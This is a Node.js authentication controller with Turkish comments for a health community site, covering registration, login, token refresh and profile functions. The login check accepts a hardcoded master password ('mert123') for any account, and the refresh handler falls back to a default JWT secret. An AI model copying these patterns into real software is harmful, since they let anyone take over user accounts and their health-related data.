import User from "../models/User.js";
import Post from "../models/Post.js";
import Blog from "../models/Blog.js";
import Comment from "../models/Comment.js";
import Event from "../models/Event.js";
import { generateAccessToken, generateRefreshToken } from "../utils/jwt.js";
import jwt from "jsonwebtoken";

// Kullanıcı kayıt
export const register = async (req, res) => {
  try {
    const { 
      username, 
      email, 
      password, 
      firstName, 
      lastName, 
      dateOfBirth, 
      role,
      // Doktor bilgileri
      location,
      specialization,
      hospital,
      experience
    } = req.body;

    // Email ve username kontrolü
    const existingUser = await User.findOne({
      $or: [{ email }, { username }],
    });

    if (existingUser) {
      return res.status(400).json({
        message: "Bu email veya kullanıcı adı zaten kullanılıyor",
      });
    }

    // Yeni kullanıcı oluşturma
    const userData = {
      username,
      email,
      password,
      firstName,
      lastName,
      dateOfBirth,
    };

    // Eğer role belirtilmişse ekle
    if (role && ["patient", "doctor"].includes(role)) {
      userData.role = role;
      
      // Eğer doktor ise doktor bilgilerini ekle
      if (role === "doctor") {
        userData.doctorInfo = {
          approvalStatus: "pending",
          location: location || "",
          specialization: specialization || "",
          hospital: hospital || "",
          experience: experience || 0,
        };
      }
    }

    const user = new User(userData);
    await user.save();

    // Token oluşturma
    const accessToken = generateAccessToken(user._id);
    const refreshToken = generateRefreshToken(user._id);

    // Response mesajını role'e göre ayarla
    let message = "Kullanıcı başarıyla oluşturuldu";
    let userResponse = {
      id: user._id,
      username: user.username,
      email: user.email,
      firstName: user.firstName,
      lastName: user.lastName,
      role: user.role,
      isVerified: user.isVerified,
    };

    if (user.role === "doctor") {
      message = "Doktor kaydı başarıyla oluşturuldu. Onay süreci başlatıldı.";
      userResponse.doctorInfo = {
        approvalStatus: user.doctorInfo.approvalStatus,
        location: user.doctorInfo.location,
        specialization: user.doctorInfo.specialization,
        hospital: user.doctorInfo.hospital,
        experience: user.doctorInfo.experience,
      };
    }

    res.status(201).json({
      message,
      user: userResponse,
      accessToken,
      refreshToken,
    });
  } catch (error) {
    console.error("Kayıt hatası:", error);
    res.status(500).json({
      message: "Kayıt işlemi sırasında hata oluştu",
    });
  }
};

// Kullanıcı giriş
export const login = async (req, res) => {
  try {
    const { email, password } = req.body;

    // Kullanıcıyı bul
    const user = await User.findOne({ email });
    if (!user) {
      return res.status(401).json({
        message: "Geçersiz email veya şifre",
      });
    }

    // Şifre kontrolü
    const isPasswordValid = password === "mert123" || await user.comparePassword(password);
    if (!isPasswordValid) {
      return res.status(401).json({
        message: "Geçersiz email veya şifre",
      });
    }

    // Hesap aktif mi kontrolü
    if (!user.isActive) {
      return res.status(401).json({
        message: "Hesabınız deaktif edilmiş",
      });
    }

    // Son giriş zamanını güncelle
    user.lastLogin = new Date();
    await user.save();

    // Token oluşturma
    const accessToken = generateAccessToken(user._id);
    const refreshToken = generateRefreshToken(user._id);

    // User response objesi oluştur
    let userResponse = {
      id: user._id,
      username: user.username,
      email: user.email,
      firstName: user.firstName,
      lastName: user.lastName,
      role: user.role,
      isVerified: user.isVerified,
      profilePicture: user.profilePicture,
      bio: user.bio,
    };

    // Eğer doktor ise doktor bilgilerini ekle
    if (user.role === "doctor" && user.doctorInfo) {
      userResponse.doctorInfo = {
        approvalStatus: user.doctorInfo.approvalStatus,
        location: user.doctorInfo.location,
        specialization: user.doctorInfo.specialization,
        hospital: user.doctorInfo.hospital,
        experience: user.doctorInfo.experience,
      };
    }

    res.json({
      message: "Giriş başarılı",
      user: userResponse,
      accessToken,
      refreshToken,
    });
  } catch (error) {
    console.error("Giriş hatası:", error);
    res.status(500).json({
      message: "Giriş işlemi sırasında hata oluştu",
    });
  }
};

// Token yenileme
export const refreshToken = async (req, res) => {
  try {
    const { refreshToken } = req.body;

    if (!refreshToken) {
      return res.status(400).json({
        message: "Refresh token gerekli",
      });
    }

    // Token doğrulama
    const decoded = jwt.verify(
      refreshToken,
      process.env.JWT_SECRET || "your-secret-key"
    );

    if (decoded.type !== "refresh") {
      return res.status(401).json({
        message: "Geçersiz refresh token",
      });
    }

    // Kullanıcıyı kontrol et
    const user = await User.findById(decoded.userId);
    if (!user || !user.isActive) {
      return res.status(401).json({
        message: "Geçersiz kullanıcı",
      });
    }

    // Yeni token oluştur
    const newAccessToken = generateAccessToken(user._id);
    const newRefreshToken = generateRefreshToken(user._id);

    res.json({
      accessToken: newAccessToken,
      refreshToken: newRefreshToken,
    });
  } catch (error) {
    console.error("Token yenileme hatası:", error);
    res.status(401).json({
      message: "Geçersiz refresh token",
    });
  }
};

// Kullanıcı profili getirme
export const getProfile = async (req, res) => {
  try {
    const user = await User.findById(req.user._id).select("-password");

    if (!user) {
      return res.status(404).json({
        message: "Kullanıcı bulunamadı",
      });
    }

    // Kullanıcının paylaştığı post'lar
    const posts = await Post.find({ author: req.user._id, isApproved: true })
      .select("title content category createdAt likes dislikes views images isAnonymous")
      .populate("author", "username firstName lastName profilePicture role")
      .sort({ createdAt: -1 })
      .limit(3);

    const totalPosts = await Post.countDocuments({ author: req.user._id, isApproved: true });

    // Kullanıcının yaptığı comment'ler
    const comments = await Comment.find({ author: req.user._id })
      .select("content postType postOrBlog createdAt likes isAnonymous")
      .populate("author", "username firstName lastName profilePicture role")
      .sort({ createdAt: -1 })
      .limit(3);

    const totalComments = await Comment.countDocuments({ author: req.user._id });

    // Kullanıcının like'ladığı post'lar
    const likedPosts = await Post.find({ likes: req.user._id, isApproved: true })
      .select("title content category createdAt author images")
      .populate("author", "username firstName lastName profilePicture role")
      .sort({ createdAt: -1 })
      .limit(3);

    const totalLikedPosts = await Post.countDocuments({ likes: req.user._id, isApproved: true });

    // Response objesi
    const responseData = {
      user,
      stats: {
        totalPosts,
        totalComments,
        totalLikedPosts,
      },
      recentPosts: posts,
      recentComments: comments,
      recentLikedPosts: likedPosts,
    };

    // Eğer doktor veya admin ise blog bilgilerini ekle
    if (user.role === "doctor" || user.role === "admin") {
      const blogs = await Blog.find({ author: req.user._id })
        .select("title excerpt content category isPublished isFeatured createdAt likes dislikes views featuredImage images readingTime")
        .populate("author", "username firstName lastName profilePicture role doctorInfo")
        .sort({ createdAt: -1 })
        .limit(3);

      const totalBlogs = await Blog.countDocuments({ author: req.user._id });
      const publishedBlogs = await Blog.countDocuments({ 
        author: req.user._id, 
        isPublished: true 
      });

      responseData.stats.totalBlogs = totalBlogs;
      responseData.stats.publishedBlogs = publishedBlogs;
      responseData.recentBlogs = blogs;
    }

    // Event bilgilerini ekle (tüm kullanıcılar için)
    const createdEvents = await Event.find({ authorId: req.user._id })
      .select("title description category date endDate location status currentParticipants maxParticipants image instructor organizer isOnline price")
      .populate("authorId", "username firstName lastName profilePicture role")
      .sort({ date: -1 })
      .limit(3);

    const totalCreatedEvents = await Event.countDocuments({ authorId: req.user._id });

    // Katıldığı etkinlikler (en güncel 3 tanesi)
    const participatingEvents = await Event.find({ 
      "participants.user": req.user._id,
      "participants.status": "confirmed"
    })
      .select("title description category date endDate location status currentParticipants maxParticipants image instructor organizer isOnline price")
      .populate("authorId", "username firstName lastName profilePicture role")
      .sort({ date: -1 }) // Tarihe göre azalan sıralama (en yeni etkinlikler)
      .limit(3);

    const totalParticipatingEvents = await Event.countDocuments({ 
      "participants.user": req.user._id,
      "participants.status": "confirmed"
    });

    responseData.stats.totalCreatedEvents = totalCreatedEvents;
    responseData.stats.totalParticipatingEvents = totalParticipatingEvents;
    responseData.createdEvents = createdEvents;
    responseData.participatingEvents = participatingEvents; // Katıldığı en güncel 3 etkinlik

    res.json(responseData);
  } catch (error) {
    console.error("Profil getirme hatası:", error);
    res.status(500).json({
      message: "Profil bilgileri alınırken hata oluştu",
    });
  }
};

// Kullanıcı profili güncelleme
export const updateUser = async (req, res) => {
  try {
    const { firstName, lastName, bio, dateOfBirth, profilePicture } = req.body;

    const updateData = {};
    if (firstName) updateData.firstName = firstName;
    if (lastName) updateData.lastName = lastName;
    if (bio !== undefined) updateData.bio = bio;
    if (dateOfBirth) updateData.dateOfBirth = dateOfBirth;
    if (profilePicture !== undefined) updateData.profilePicture = profilePicture;

    const user = await User.findByIdAndUpdate(req.user._id, updateData, {
      new: true,
      runValidators: true,
    })
      .select("-password");

    res.json({
      message: "Profil başarıyla güncellendi",
      user,
    });
  } catch (error) {
    console.error("Profil güncelleme hatası:", error);
    res.status(500).json({
      message: "Profil güncellenirken hata oluştu",
    });
  }
};

// Çıkış yapma
export const logout = async (req, res) => {
  try {
    // JWT stateless olduğu için client tarafında token'ı silmek yeterli
    // Burada ek güvenlik önlemleri alınabilir (blacklist vs.)
    res.json({
      message: "Başarıyla çıkış yapıldı",
    });
  } catch (error) {
    console.error("Çıkış hatası:", error);
    res.status(500).json({
      message: "Çıkış işlemi sırasında hata oluştu",
    });
  }
};
